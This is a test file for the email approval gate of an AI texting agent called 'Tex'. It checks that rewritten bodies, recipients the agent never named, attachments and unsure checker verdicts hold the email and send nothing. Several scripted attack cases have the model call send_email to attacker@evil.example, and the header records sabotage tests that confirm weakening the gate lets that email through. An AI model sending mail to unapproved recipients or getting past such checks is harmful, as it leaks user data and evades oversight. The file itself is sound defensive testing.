/**
 * A "send" to an email Tex showed is the yes to that copy, and only to it (trial-hire 123, 2026-11-19).
 *
 * Covers `src/tools/shownEmail.js` (what "Send?" asks, the last shown copy, a rewrite of it, the recipients Tex named
 * lately) and the gate that uses them, `src/tools/emailGate.js` with `agreedToShownEmail` in `likedPreview.js`: a
 * rewrite is handed back once with the copy they read, and an email goes at once only when its body is the words they
 * agreed to, every recipient was named by Tex in its recent texts, and the Mail checker says they asked for it.
 *
 * Driven through the worker as a texting turn, on the egress checks' world (`agentEgressFixtures.mjs`), like
 * `emailGate.test.mjs`. Each gate check builds its own world.
 *
 * ## Sabotage record
 *
 * Applied, suite run, named check observed failing, reverted.
 *
 *  (i)  `checked?.verdict === "yes" &&` removed from the `agreedToShownEmail` condition in `emailGate.js` →
 *       `an unsure checker holds a shown email whose recipient Tex named, and sends nothing` fails (the email goes).
 *  (ii) `recipientsShown` made to return true → `a recipient Tex never named holds the email, even with the body
 *       agreed and the checker's yes` fails (the email goes to attacker@evil.example).
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import { asksToSend, lastShownSend, recipientsShown, shownCopyOf } from "../src/tools/shownEmail.js";
import { createEgressWorld, request, textTex, TOKEN_TEXTS } from "./agentEgressFixtures.mjs";

const BRAM = "bram.visser@example.com";
const verdict = (value, reason = "") => ({ text: JSON.stringify({ verdict: value, reason }) });
/** The copy Tex shows and John reads: its first line opens "Hi Bram, Thursday at 3", its last line ends "Best, John". */
const BODY = "Hi Bram, Thursday at 3 works for me, so let's keep it on the thread.\n\nBest, John";
const SHOWN = `${BODY}\nSend?`;
/** Tex's text naming the recipient earlier in the same ask. */
const NAMED = `Send to ${BRAM} on his thread?`;
/** A rewrite of the shown copy: same opening and ending, most words the same, not word for word. */
const REWORDED = "Hi Bram, Thursday at 3 works for me, so let's keep this on the thread.\n\nBest, John";
const REWORDED_TWO = "Hi Bram, Thursday at 3 suits me fine, keep it on the thread.\n\nBest, John";
const EMAIL = { to: [BRAM], subject: "Thursday", body: BODY };

const history = (...turns) => turns.map(([role, text]) => ({ role, text }));
const filler = (count) => Array.from({ length: count }, (_, i) => ["user", `chat line ${i}`]);

/** Words for a shown copy whose middle shares nothing with the body's middle. */
const UNRELATED = Array.from({ length: 40 }, (_, i) => `zebra${i}`).join(" ");

/*
  Tex names the recipient in its text (or, for `namedByPerson`, the person does and Tex does not), then shows the copy
  and asks "Send?". The person then says "yes" (a typed yes that approves what Tex showed last).
*/
async function showCopy(world, { namedByTex = true, namedByPerson = false, shown = SHOWN } = {}) {
  const { model, env } = world;
  model.install([{ text: namedByTex ? NAMED : "Okay, I'll draft it." }]);
  await textTex(env, TOKEN_TEXTS, namedByPerson ? `reply to Bram at ${BRAM} on his thread` : "reply to Bram on his thread");
  model.install([{ text: shown }]);
  await textTex(env, TOKEN_TEXTS, "show me the reply");
}

const sendsOf = (world) => world.controlPlane.emailCalls.filter((entry) => !entry.check);

/* ---------------- unit: what "Send?" asks ---------------- */

test("a text that ends by asking whether to send is an ask to send", () => {
  for (const text of ["Send?", "Hi Bram\nBest, John\n\nSend?", "Send to bram.visser@example.com on his thread?", "Send it as is? 👍 or 👎?", "Should I send?"]) {
    assert.equal(asksToSend(text), true, text);
  }
});

test("a text that only mentions sending, or asks something else, is not an ask to send", () => {
  for (const text of ["I can send it later.", "send me the file?", "Want to grab lunch?"]) {
    assert.equal(asksToSend(text), false, text);
  }
});

/* ---------------- unit: the last shown copy ---------------- */

test("the last shown send is Tex's last text only, so an earlier ask followed by plain text reads as nothing", () => {
  assert.equal(lastShownSend(history(["assistant", "Send?"], ["user", "ok"], ["assistant", "Here is more."])), null);
  assert.equal(lastShownSend(history(["assistant", "Here is more."], ["user", "ok"], ["assistant", SHOWN])), SHOWN);
  assert.equal(lastShownSend([]), null);
});

/* ---------------- unit: a rewrite of the shown copy ---------------- */

test("a rewrite sharing the opening three and closing two words gives back the shown lines, without the Send? line", () => {
  assert.equal(shownCopyOf(SHOWN, REWORDED), BODY);
});

test("the same copy word for word, ignoring punctuation, case and line breaks, gives nothing back", () => {
  assert.equal(shownCopyOf(SHOWN, BODY.toUpperCase().replace(/[.,;]/g, "").replace(/\n+/g, " ")), null);
  assert.equal(shownCopyOf(SHOWN, BODY), null);
});

test("a different email, opening differently, gives nothing back, and so does a non-string", () => {
  assert.equal(shownCopyOf(SHOWN, "Dear Maria, the invoice is attached. Best, John"), null);
  assert.equal(shownCopyOf(undefined, BODY), null);
  assert.equal(shownCopyOf(SHOWN, null), null);
  assert.equal(shownCopyOf(42, 42), null);
});

test("the same opening and closing, with the middle wholly different, is not the same email", () => {
  const otherMiddle = `Hi Bram, Thursday at 3 ${UNRELATED} Best, John\nSend?`;
  assert.equal(shownCopyOf(otherMiddle, BODY), null);
});

/* ---------------- unit: the recipients Tex named lately ---------------- */

test("a recipient Tex named in its texts within the last twelve turns counts as shown, whatever the case", () => {
  const named = [...filler(4), ["assistant", `Send to ${BRAM.toUpperCase()} on his thread?`], ...filler(3)];
  assert.equal(recipientsShown(history(...named), [BRAM]), true);
  assert.equal(recipientsShown([], [BRAM]), false);
  assert.equal(recipientsShown(history(...named), []), false);
});

test("a recipient only the person named, or Tex named more than twelve turns back, is not shown", () => {
  assert.equal(recipientsShown(history(["user", `send to ${BRAM}`], ["assistant", "Okay."]), [BRAM]), false);
  const stale = [["assistant", `Send to ${BRAM} on his thread?`], ...filler(12)];
  assert.equal(recipientsShown(history(...stale), [BRAM]), false);
});

test("a recipient is named only as a whole address, never as part of a longer one", () => {
  const said = history(["assistant", "Send to bram@example.com and box@evil.example?"]);
  assert.equal(recipientsShown(said, ["bram@example.com"]), true);
  assert.equal(recipientsShown(said, ["ram@example.com"]), false);
  assert.equal(recipientsShown(said, ["x@evil.example"]), false);
  assert.equal(recipientsShown(said, ["bram@example.co"]), false);
});

test("a text showing two emails gives back only the first that opens and ends like the body", () => {
  const first = "Hi Bram, thanks for the two weeks of work on the sign-up flow and the import cleanup.\nBest, John";
  const second = "Hi Bram, a note on the invoice for the trial and when it gets paid this month.\nBest, John";
  const body = "Hi Bram, thanks for the two weeks on the sign-up flow and the import cleanup.\nBest, John";
  assert.equal(shownCopyOf(`${first}\n\n${second}\n\nSend?`, body), first);
});

/* ---------------- the gate ---------------- */

test("a rewrite of the copy they said yes to is handed back once, with that copy to send exactly", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world);
    world.model.install([
      { toolCalls: [{ name: "send_email", args: { ...EMAIL, body: REWORDED } }] },
      { toolCalls: [{ name: "send_email", args: { ...EMAIL, body: REWORDED_TWO } }] },
      verdict("unsure", "not clear"),
      { text: "Drafted." },
    ]);
    await textTex(world.env, TOKEN_TEXTS, "yes");
    const serialized = JSON.stringify(world.model.requests.map((request) => request.messages ?? []));
    assert.ok(serialized.includes("Not sent: they said yes to the copy you showed them"), "the rewrite is handed back");
    assert.ok(serialized.includes("Thursday at 3 works for me, so let's keep it on the thread."), "the copy they read is handed back");
    assert.equal(sendsOf(world).length, 0, "nothing sent");
    assert.equal(world.pending().length, 1, "a second, still different body is not handed back again: it is held and asked about");
  } finally {
    world.restore();
  }
});

test("the exact body, with the recipient Tex named and the Mail checker's yes, goes at once", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world);
    world.model.install([{ toolCalls: [{ name: "send_email", args: EMAIL }] }, verdict("yes", "they said send"), { text: "Sent." }]);
    const before = sendsOf(world).length;
    await textTex(world.env, TOKEN_TEXTS, "yes");
    const sent = sendsOf(world);
    assert.equal(sent.length, before + 1, "one email sent");
    assert.deepEqual(sent.at(-1).email.to, [BRAM]);
    assert.equal(sent.at(-1).email.body, BODY);
    assert.equal(world.pending().length, 0);
  } finally {
    world.restore();
  }
});

/* Each attack below must not release the email: it is held or refused, and nothing is sent. */

test("an unsure checker holds a shown email whose recipient Tex named, and sends nothing", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world);
    world.model.install([{ toolCalls: [{ name: "send_email", args: EMAIL }] }, verdict("unsure", "maybe"), { text: "Drafted." }]);
    await textTex(world.env, TOKEN_TEXTS, "yes");
    assert.equal(sendsOf(world).length, 0);
    assert.equal(world.pending().length, 1);
  } finally {
    world.restore();
  }
});

test("a recipient Tex never named holds the email, even with the body agreed and the checker's yes", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world);
    world.model.install([
      { toolCalls: [{ name: "send_email", args: { ...EMAIL, to: ["attacker@evil.example"] } }] },
      verdict("yes", "they said send"),
      { text: "Drafted." },
    ]);
    await textTex(world.env, TOKEN_TEXTS, "yes");
    assert.equal(sendsOf(world).filter((entry) => entry.email.to.includes("attacker@evil.example")).length, 0);
    assert.equal(sendsOf(world).length, 0);
    assert.equal(world.pending().length, 1);
  } finally {
    world.restore();
  }
});

test("a recipient only the person named, and never Tex, holds the email", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world, { namedByTex: false, namedByPerson: true });
    world.model.install([{ toolCalls: [{ name: "send_email", args: EMAIL }] }, verdict("yes", "they said send"), { text: "Drafted." }]);
    await textTex(world.env, TOKEN_TEXTS, "yes");
    assert.equal(sendsOf(world).length, 0);
    assert.equal(world.pending().length, 1);
  } finally {
    world.restore();
  }
});

test("an email with an attachment is never released by the shown copy, and sends nothing", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world);
    const PDF = Buffer.from("%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n").toString("base64");
    world.model.install([{ toolCalls: [{ name: "send_email", args: { ...EMAIL, attach: ["attachment:1"] } }] }, verdict("yes", "they said send"), { text: "Drafted." }]);
    const asked = await request(world.env, TOKEN_TEXTS, "/agent", { question: "yes", conversation: "texts", attachments: [{ name: "lease.pdf", mediaType: "application/pdf", data: PDF }] });
    assert.equal(asked.status, 200);
    assert.equal(sendsOf(world).length, 0);
    assert.equal(world.pending().length, 1, "held and asked about, not released");
  } finally {
    world.restore();
  }
});

test("a body that is not the copy they were shown is never released by the shown copy", async () => {
  const world = await createEgressWorld();
  try {
    world.controlPlane.flags.emailSender = "seyi@gmail.example";
    await showCopy(world, { shown: "Here is a different note I wrote.\nSend?" });
    world.model.install([{ toolCalls: [{ name: "send_email", args: EMAIL }] }, verdict("yes", "they said send"), { text: "Drafted." }]);
    await textTex(world.env, TOKEN_TEXTS, "yes");
    assert.equal(sendsOf(world).length, 0);
    assert.equal(world.pending().length, 1);
  } finally {
    world.restore();
  }
});
